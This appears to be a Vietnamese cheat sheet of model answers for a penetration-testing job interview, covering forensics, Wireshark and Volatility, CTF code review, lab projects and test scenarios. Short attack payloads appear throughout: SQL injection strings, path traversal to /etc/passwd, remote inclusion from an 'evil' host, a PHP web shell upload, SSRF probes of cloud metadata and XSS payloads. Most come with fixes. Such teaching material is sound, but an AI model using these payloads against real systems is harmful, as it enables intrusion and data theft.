---
title: "tra loi pv chi tiet P3"
---

# Trả lời PV chi tiết P3 - Forensics + CTF + Code + Project + Tình huống + HR (câu 177-275)

## 12. Forensics (177-195)
### 178. Quy trình?
Mẫu: Bảo toàn -> thu thập -> phân tích -> báo cáo.
VD chi tiết: Nhận USB nghi, đầu tiên `sha256sum usb.img` ghi hash, mount `mount -o ro`, copy ra bản làm việc, mọi phân tích trên bản copy, cuối so hash lại giống nhau mới hợp pháp.

### 187. Lọc HTTP Wireshark?
Mẫu: `http`, `ip.addr==`, follow stream.
VD chi tiết: Mở `capture.pcap`, gõ `http.request.method==POST && http contains "pass"`, chuột phải Follow TCP Stream thấy `user=admin&pass=123456` plain vì web HTTP. `http contains "flag{")` tìm flag CTF. `dns.qry.name contains "evil"` tìm C2.

### 191. Dấu C2?
Mẫu: Beacon đều, DNS lạ, POST nhỏ đều.
VD chi tiết: `Statistics->Conversations` thấy `192.168.1.5` POST 200 bytes tới `xyz123.onion` mỗi 60s đúng giờ cả đêm, UA `curl/7.0` lạ, DNS query domain random 20 ký tự -> nghi C2. Bình thường browse lung tung giờ + size khác nhau.

### 194. Volatility?
Mẫu: Mổ RAM lấy process/net/pass.
VD chi tiết: `vol.py -f mem.raw imageinfo` đoán Win7, `pslist` thấy `notepad.exe` PID lạ + `mimikatz.exe`, `netscan` thấy connect tới IP ngoài 4444, `hashdump` lấy hash để crack.

## 13-14. CTF + Code (196-214)
### 202. Bắt đầu web CTF?
Mẫu: Xem source/robots/JS + Burp map.
VD chi tiết: Mở đề cho URL + source.zip, đọc `app.py` thấy `query = f"SELECT...{id}"` là SQLi ngay, đồng thời F12 xem comment `<!-- /debug? -->`, ffuf thêm `/backup.zip`, Burp xem history login request để thử.

### 207. SQLi từ code?
Mẫu: Tìm query ghép biến `$_GET`.
VD chi tiết: Thấy `$sql = "SELECT * FROM users WHERE id='".$_GET['id']."'"`; nhập `1' OR '1'='1-- -` là dính. Fix `prepare("...WHERE id=?", [$id])`. Tương tự `order by $_GET['sort']` cũng inject được.

### 211. File inclusion?
Mẫu: Tìm include với biến.
VD chi tiết: `include("pages/".$_GET['page'].".php")` thử `?page=../../../../etc/passwd%00` null byte bỏ `.php`, hoặc `?page=https://evil/shell.txt` nếu `allow_url_include=On` thành RCE.

## 16. Project (225-234)
### 228-229. Tạo vuln sao? Upload?
Mẫu: Cố tình chỉ check tên, bỏ content check.
VD chi tiết: Code `if(strpos($name,".jpg")!==false) move_uploaded_file(...)`. Upload `shell.php.jpg` với `<?php system($_GET['cmd']);?>` lọt, gọi `/uploads/shell.php.jpg?cmd=whoami` trả `www-data`. Kể luôn fix: whitelist `in_array(ext,["jpg","png"])` + `mime_content_type` + `uniqid().jpg` + disable php trong uploads.

## 18. Tình huống (241-254)
### 241. Cho domain no source?
Mẫu: Scope -> sub/dir/tech -> OWASP checklist.
VD chi tiết: `subfinder -d shop.vn`, `httpx` lọc sống, `ffuf` dir, mở JS tìm `/api`, Burp click hết, test theo thứ tự login/reset -> IDOR -> inject -> upload -> SSRF param URL.

### 242. Login test gì?
Mẫu: SQLi/enum/brute/reset/2FA/session.
VD chi tiết: Thử `admin'-- -`, user đúng pass sai báo `sai pass` còn user sai báo `không tồn tại` là enum, Intruder 20 pass xem lock không, `Host: evil` test reset poisoning, verify 2FA có skip `GET /dashboard` được không.

### 245. Param URL nghi SSRF?
Mẫu: Thử collab + internal + metadata.
VD chi tiết: `?img=https://collab.oastify.com` xem ping về không, sau đó `http://127.0.0.1/`, `http://169.254.169.254/latest/`, `http://evil%40whitelist/` bypass, đọc response length khác là dính.

### 247. XSS không chạy?
Mẫu: F12 xem encode/context/CSP.
VD chi tiết: Nhập `<svg onload=alert(1)>` mà hiện chữ là bị encode `<` thành `&lt;`. Thử đóng context `"</textarea><svg...>` hoặc `"-alert(1)-"`, console báo CSP block thì tìm domain whitelist có JSONP như P1 câu 64.

### 253. Thấy data thật?
Mẫu: Dừng, không lưu, báo ngay, xóa local.
VD chi tiết: Repeater đổi ID thấy CCCD người thật, dừng Intruder ngay, chụp 1 dòng che số để PoC, nhắn lead/khách, xóa log local, không tải full DB về.

## 19-20. Đánh vào CV + HR (255-275)
### 255. 1 vuln end-to-end?
Mẫu: Chọn IDOR kể cause->exploit->impact->fix.
VD chi tiết: Cause code `SELECT * FROM orders WHERE id=$_GET['id']` không check owner. Exploit login A `GET /order/1001` của mình, đổi `1002` hiện tên/sđt/địa chỉ B. Impact lộ PII 10k user, High. Fix `if($order->owner != $_SESSION['id']) deny` + dùng UUID khó đoán.

### 262-263. Lab khó nhất? Sao chưa 100%?
Mẫu: Thật thà blind/OOB khó nhất, thiếu advanced.
VD chi tiết: Em xong XSS/CSRF/SSRF/SQLi cơ bản, kẹt blind time phải brute từng char mất giờ + smuggling/cache/JWT chưa xong, đang vá theo checklist P0. Không chém đã 70% hết vì interview hỏi sâu JWT là lộ.

### 270. Task chưa biết?
Mẫu: Thử doc/lab nhỏ 1h rồi hỏi mentor, note lại.
VD chi tiết: Giao test GraphQL chưa biết, em đọc doc introspection `/{__schema{types{name}}}` lab 1h, không ra thì hỏi senior kèm những gì đã thử, ghi lại blog để lần sau biết.
